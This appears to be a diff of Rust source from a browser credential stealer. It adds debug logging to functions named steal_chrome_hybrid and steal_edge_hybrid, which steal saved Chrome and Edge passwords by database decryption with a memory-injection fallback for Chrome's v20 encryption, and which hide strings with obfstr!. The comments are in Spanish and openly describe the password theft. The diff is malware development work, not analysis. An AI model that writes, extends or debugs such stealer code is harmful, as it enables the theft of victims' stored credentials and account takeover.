@@ -401,11 +401,31 @@ fn decrypt_dpapi_fallback(_encrypted_data: &[u8]) -> StealerResult<String> {
 
 /// Roba Chrome passwords con fallback a memory injection si v20 detectado
 pub fn steal_chrome_hybrid() -> StealerResult<Vec<Credential>> {
+    // DEBUG: Escribir ANTES de llamar a hybrid
+    if let Ok(mut f) = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(std::env::temp_dir().join("stealer_debug.txt")) {
+        use std::io::Write;
+        let _ = writeln!(f, "\n🚀 [ENTRY] steal_chrome_hybrid() CALLED");
+        let _ = f.flush();
+    }
+    
     steal_chromium_hybrid(obfstr!("Chrome"))
 }
 
 /// Roba Edge passwords con fallback a memory injection si v20 detectado
 pub fn steal_edge_hybrid() -> StealerResult<Vec<Credential>> {
+    // DEBUG: Escribir ANTES de llamar a hybrid
+    if let Ok(mut f) = std::fs::OpenOptions::new()
+        .create(true)
+        .append(true)
+        .open(std::env::temp_dir().join("stealer_debug.txt")) {
+        use std::io::Write;
+        let _ = writeln!(f, "\n🚀 [ENTRY] steal_edge_hybrid() CALLED");
+        let _ = f.flush();
+    }
+    
     steal_chromium_hybrid(obfstr!("Edge"))
 }
 
@@ -424,15 +444,19 @@ fn steal_chromium_hybrid(browser_name: &str) -> StealerResult<Vec<Credential>> {
     let mut log = |msg: &str| {
         if let Some(ref mut file) = debug_file {
             let _ = writeln!(file, "{}", msg);
+            let _ = file.flush(); // Forzar escritura inmediata
         }
     };
     
-    log(&format!("\n═══ HYBRID PASSWORD THEFT: {} ═══", browser_name));
+    log(&format!("\n\n═══════════════════════════════════════"));
+    log(&format!("═══ HYBRID PASSWORD THEFT: {} ═══", browser_name));
+    log(&format!("═══════════════════════════════════════"));
     
     // PASO 1: Intentar método tradicional (DB + decrypt)
     log("🔸 PASO 1: Método tradicional (DB + decrypt)...");
     
-    let traditional_result = if browser_name == obfstr!("Chrome") {
+    let is_chrome = browser_name.to_lowercase().contains("chrome");
+    let traditional_result = if is_chrome {
         steal_chrome()
     } else {
         steal_edge()
